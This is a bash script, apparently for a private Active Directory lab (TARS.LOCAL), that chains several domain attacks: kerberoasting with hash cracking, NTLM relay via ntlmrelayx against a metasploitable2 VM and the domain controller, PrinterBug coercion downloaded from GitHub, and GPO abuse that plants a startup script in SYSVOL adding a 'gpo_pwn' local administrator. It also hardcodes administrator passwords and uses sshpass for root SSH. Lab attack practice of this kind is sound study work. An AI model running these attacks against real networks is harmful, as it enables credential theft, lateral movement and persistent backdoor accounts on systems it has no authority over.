#!/usr/bin/env bash
# =============================================================================
# SUITE AD REAL — ROUND 2 (fixes) — TARS.LOCAL 2026-08-09
# R1 kerberoast (fix exec perm) + crack
# R2 metasploitable2: diagnostic start + relay win (ntlmrelayx, SAM dump attempt)
# R3 printerbug (URL fix) + spoolss coercion attempt
# R4 relay->DC SMB (signing-block finding, trigger manual)
# R5 GPO abuse via sshpass ssh root@DC (create/link/SYSVOL/verify)
# =============================================================================
set -u
DC=192.168.122.50
REALM=TARS.LOCAL
ADMIN='Administrator'
ADMPW='TarsLab2026!'
VENV=/opt/ad-tools-venv/bin
SKILLDIR=/opt/ad-lab/suite-ad-real
OUT=/opt/ad-lab/evidence/suite-ad-real-20260809
HOST_IP=192.168.122.1
WORDLIST=/tmp/wordlist-lab.txt
TS(){ date +%H:%M:%S; }
SSH_DC="sshpass -p TarsLab2026! ssh -o StrictHostKeyChecking=accept-new -o ConnectTimeout=10 root@$DC"

echo "[$(TS)] ============ ROUND 2 START ============"
# ---------- R1: kerberoast ----------
echo "[$(TS)] === R1 kerberoast (chmod +x fix) ==="
chmod +x $SKILLDIR/*.sh $SKILLDIR/*.py
timeout 240 $SKILLDIR/samba-kerberoast.sh $DC $REALM "$ADMIN" "$ADMPW" \
  MSSQLSvc/dc01.tars.local:1433 CIFS/backup.tars.local HTTP/app.tars.local HTTP/web.tars.local \
  2>&1 | tee "$OUT/02-kerberoast-hashes.txt"; echo "rc=$?"
grep '^\$krb5tgs\$' "$OUT/02-kerberoast-hashes.txt" > "$OUT/02-kerb.hashes" 2>/dev/null || true
echo "[$(TS)] TGS hashes: $(wc -l < "$OUT/02-kerb.hashes")"
if [ -s "$OUT/02-kerb.hashes" ]; then
  timeout 300 $VENV/python3 $SKILLDIR/crack-krb5tgs-rc4.py "$OUT/02-kerb.hashes" "$WORDLIST" 2>&1 | tee "$OUT/04-kerb-crack.txt"; echo "rc=$?"
fi

# ---------- R2: metasploitable2 ----------
echo "[$(TS)] === R2 metasploitable2 (diagnostico arranque) ==="
echo "[$(TS)] -- estado /data + disco VM:"
lsblk -o NAME,SIZE,LABEL,MOUNTPOINT 2>/dev/null | head -12
grep -E " /data " /proc/mounts 2>/dev/null
echo "[$(TS)] -- disk path + SELinux label de la VM:"
virsh dumpxml metasploitable2 2>&1 | grep -E "source file|mac address" | head -3
META_DISK=$(virsh dumpxml metasploitable2 2>/dev/null | grep -oE "source file='[^']+'" | cut -d"'" -f2 | head -1)
echo "META_DISK=${META_DISK:-none}"
[ -n "${META_DISK:-}" ] && ls -lZ "$META_DISK" 2>&1
echo "[$(TS)] -- virsh start (sin suprimir errores):"
virsh start metasploitable2 2>&1 | tee "$OUT/08a-virsh-start.txt"; echo "start rc=$?"
if virsh list --all | grep -q "metasploitable2.*running"; then
  echo "[$(TS)] VM RUNNING — esperando DHCP"
  for i in $(seq 1 12); do
    sleep 10
    META_MAC=$(virsh dumpxml metasploitable2 2>/dev/null | grep -oE 'mac address="[0-9a-f:]+"' | cut -d'"' -f2)
    META_IP=$(virsh net-dhcp-leases default 2>/dev/null | awk -v m="$META_MAC" 'toupper($2)==toupper(m){print $5}' | head -1)
    [ -n "${META_IP:-}" ] && break
  done
  echo "[$(TS)] metasploitable2 IP=${META_IP:-NONE} (mac=$META_MAC)"
  if [ -n "${META_IP:-}" ]; then
    echo "$META_IP" > "$OUT/08a-meta-ip.txt"
    timeout 20 $VENV/nxc smb "$META_IP" -u '' -p '' --shares 2>&1 | tee "$OUT/08a-meta-anon-shares.txt"
    # ---- RELAY WIN: capturar auth de Administrator y relayar a metasploitable2 ----
    echo "[$(TS)] === R2b relay Administrator -> metasploitable2 ==="
    $VENV/ntlmrelayx.py -t "smb://$META_IP" -smb2support -l "$OUT/relay-loot-meta" >"$OUT/08-relayx-meta.log" 2>&1 &
    RELAYPID=$!
    sleep 4
    echo "[$(TS)] trigger: smbclient Administrator autentica contra listener .1"
    timeout 25 smbclient //$HOST_IP/relay -U "$ADMIN%$ADMPW" -c 'ls' 2>&1 | tee "$OUT/08c-trigger-smbclient.txt"
    sleep 10
    kill $RELAYPID 2>/dev/null; wait $RELAYPID 2>/dev/null
    echo "[$(TS)] relay log (filtrado):"
    grep -E "Authenticated|Dumping|SAM|Share|share|NT_STATUS|SMB Session|Attempting|ERROR|error|tmp|Wrote" "$OUT/08-relayx-meta.log" | head -35 | tee "$OUT/08d-relay-meta-result.txt"
    echo "[$(TS)] relay loot:"; ls -la "$OUT/relay-loot-meta/" 2>/dev/null | head -10
  fi
else
  echo "[$(TS)] metasploitable2 NO arranco — se documenta; relay win via DC-signing finding en R4"
fi

# ---------- R3: printerbug (URL fix) + spoolss coercion ----------
echo "[$(TS)] === R3 printerbug fetch + spoolss coercion ==="
cd "$SKILLDIR"
curl -sL --max-time 30 -o printerbug-master.py https://raw.githubusercontent.com/coderion/PrinterBug/master/printerbug.py
head -c 60 printerbug-master.py > /dev/null 2>&1
if grep -q "404" printerbug-master.py 2>/dev/null; then
  echo "[$(TS)] master 404 — probando API tree"
  curl -s --max-time 30 "https://api.github.com/repos/coderion/PrinterBug/git/trees/master?recursive=1" | grep -oE '"path": "[^"]*\.py"' | head -5 | tee "$OUT/08b-printerbug-tree.txt"
else
  mv -f printerbug-master.py printerbug.py
fi
ls -la printerbug.py 2>&1 | tee -a "$OUT/08b-coercion-tools.txt"
if [ -s printerbug.py ] && ! grep -q "404" printerbug.py; then
  timeout 40 $VENV/python3 "$SKILLDIR/printerbug.py" "$HOST_IP" $DC 2>&1 | grep -vE "^\s*\|" | tee "$OUT/08g-printerbug.txt"; echo "rc=$?"
else
  echo "printerbug no disponible (URL 404)" | tee "$OUT/08g-printerbug.txt"
fi

# ---------- R4: relay -> DC SMB (signing block, trigger manual) ----------
echo "[$(TS)] === R4 relay Administrator -> DC SMB (expect signing block) ==="
$VENV/ntlmrelayx.py -t "smb://$DC" -smb2support -l "$OUT/relay-loot-dcsmb" >"$OUT/08-relayx-dcsmb.log" 2>&1 &
RELAYPID=$!
sleep 4
timeout 25 smbclient //$HOST_IP/relay -U "$ADMIN%$ADMPW" -c 'ls' 2>&1 | tee "$OUT/08h-trigger-dcsmb.txt"
sleep 10
kill $RELAYPID 2>/dev/null; wait $RELAYPID 2>/dev/null
grep -E "Authenticated|Dumping|SAM|Share|NT_STATUS|SMB Session|Attempting|ERROR|error|signing" "$OUT/08-relayx-dcsmb.log" | head -25 | tee "$OUT/08i-relay-dcsmb-result.txt"

# ---------- R5: GPO abuse (sshpass -> DC) ----------
echo "[$(TS)] === R5 GPO ABUSE via sshpass ==="
echo "[$(TS)] -- test ssh DC:"
$SSH_DC 'hostname; samba-tool gpo listall 2>&1 | head -8' 2>&1 | tee "$OUT/09a-ssh-test.txt"
GPO_OUT=$($SSH_DC "samba-tool gpo create 'TARS-GPO-Abuse' -U 'Administrator%TarsLab2026!'" 2>&1)
echo "$GPO_OUT" | tee "$OUT/09b-gpo-create.txt"
GPO_GUID=$(echo "$GPO_OUT" | grep -oE '\{[0-9A-Fa-f-]{36}\}' | head -1)
echo "[$(TS)] GPO_GUID=${GPO_GUID:-NONE}"
if [ -n "${GPO_GUID:-}" ]; then
  $SSH_DC "samba-tool gpo setlink 'CN=Users,DC=tars,DC=local' '$GPO_GUID' -U 'Administrator%TarsLab2026!'" 2>&1 | tee "$OUT/09c-gpo-setlink.txt"
  printf '@echo off\r\nnet user gpo_pwn Pwned2026! /add\r\nnet localgroup Administrators gpo_pwn /add\r\n' > /tmp/startup.cmd
  printf '[Startup]\r\n0CmdLine=startup.cmd\r\n0Parameters=\r\n' > /tmp/scripts.ini
  printf '[General]\r\nVersion=2\r\ngPCMachineExtensionNames=[{42B5FAAE-6536-11D2-AE5A-0000F87571E3}{40B6664F-4972-11D1-A7CA-0000F87571E3}]\r\n' > /tmp/gpt.ini
  smbclient //$DC/sysvol -U "$ADMIN%$ADMPW" -c "cd Policies/$GPO_GUID/Machine/Scripts; mkdir Startup; cd Startup; put /tmp/startup.cmd; put /tmp/scripts.ini; ls; cd ../../..; put /tmp/gpt.ini; ls" 2>&1 | tee "$OUT/09d-sysvol-write.txt"; echo "rc=$?"
  $SSH_DC "samba-tool gpo show '$GPO_GUID' 2>&1; echo ---; samba-tool gpo getlink 'CN=Users,DC=tars,DC=local' 2>&1; echo ---; ls -la '/var/lib/samba/sysvol/tars.local/Policies/$GPO_GUID/Machine/Scripts/Startup/' 2>&1; echo ---; cat '/var/lib/samba/sysvol/tars.local/Policies/$GPO_GUID/Machine/Scripts/Startup/startup.cmd' 2>&1" | tee "$OUT/09e-gpo-verify.txt"
else
  echo "[$(TS)] GPO create fallo: $GPO_OUT" | tee "$OUT/09b-gpo-create.txt"
fi

# ---------- cleanup: apagar metasploitable2 (devolver RAM al host) ----------
virsh shutdown metasploitable2 2>&1 | head -1

echo "[$(TS)] ============ ROUND 2 DONE ============"
cd "$OUT" && sha256sum 0*.txt 0*.hashes 2>/dev/null | tee -a "$OUT/manifest.sha256"
